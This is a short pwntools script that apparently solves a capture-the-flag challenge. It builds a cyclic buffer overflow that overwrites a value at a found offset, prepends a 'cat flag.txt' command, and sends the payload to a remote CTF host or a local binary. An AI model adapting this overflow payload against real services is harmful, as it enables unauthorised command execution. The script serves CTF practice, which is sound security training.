from pwn import *

local = False

if local:
    p = process("./chal 0", shell=True)
    input("attach gdb")
else:
    p = remote("cha.hackpack.club", 10991)

p.recvuntil(b"$ ")
payload = cyclic(500)
payload = payload[:cyclic_find(b'laaa')] + p32(1)
command = b'cat flag.txt\x00'
payload = command + payload[len(command):]
p.sendline(payload)
p.interactive()

